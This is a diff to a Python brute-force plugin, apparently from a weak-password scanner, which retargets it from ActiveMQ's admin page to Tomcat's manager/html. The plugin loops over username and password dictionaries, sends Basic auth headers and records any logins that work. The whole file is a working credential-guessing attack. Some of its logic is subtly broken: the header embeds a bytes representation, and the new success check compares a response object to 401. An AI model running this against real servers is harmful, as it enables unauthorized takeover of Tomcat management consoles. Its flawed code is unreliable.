@@ -6,21 +6,21 @@ from base64 import b64encode, b64decode
 
 def info(data=None):
     info = {
-        "name": "Acticemq burst",
-        "info": "activemq burst.",
+        "name": "tomcat burst",
+        "info": "tomcat burst.",
         "level": "high",
         "type": "weakpass",
     }
     return info
 
 def prove(data):
-    data = init(data, 'activemq')
+    data = init(data, 'tomcat')
     if data['base_url']:
-        usernamedic = _read_dic(data['d1']) if 'd1' in data.keys() else  _read_dic('dict/activemq_usernames.txt')
-        passworddic = _read_dic(data['d2']) if 'd2' in data.keys() else  _read_dic('dict/activemq_passwords.txt')
-        url = data['base_url'] + "admin/"
+        usernamedic = _read_dic(data['d1']) if 'd1' in data.keys() else  _read_dic('dict/tomcat_usernames.txt')
+        passworddic = _read_dic(data['d2']) if 'd2' in data.keys() else  _read_dic('dict/tomcat_passwords.txt')
+        url = data['base_url'] + 'manager/html'
         res = curl('get', url)
-        if res == 401 :
+        if res.status_code == 401 and '401 Unauthorized' in res.text and 'tomcat' in res.text:
             for linef1 in usernamedic:
                 username = linef1.strip('\r').strip('\n')
                 for linef2 in passworddic:
@@ -28,13 +28,13 @@ def prove(data):
                         password = (
                             linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                             '\r').strip('\n')
-                        key = b64encode(bytes(":".join([username, password]), 'utf-8'))
-                        headers = {"Authorization":  'Basic %s' % key}
+                        key = b64encode(bytes(":".join([username,password]),'utf-8'))
+                        headers = {"Authorization" : 'Basic %s' % key}
                         res = curl('get',url,headers = headers)
-                        if 'Console' in res.text:
+                        if res != 401 and 'manage' in res.text:
                             data['flag'] = 1
                             data['data'].append({"username": username,"password":password})
-                            data['res'].append({"info": username + "/" + password, "key": "Authorization: " + ":".join([username, password])})
+                            data['res'].append({"info": username + "/" + password, "key": "Authorization: " + ":".join([username,password])})
                     except Exception:
                         pass
     return data
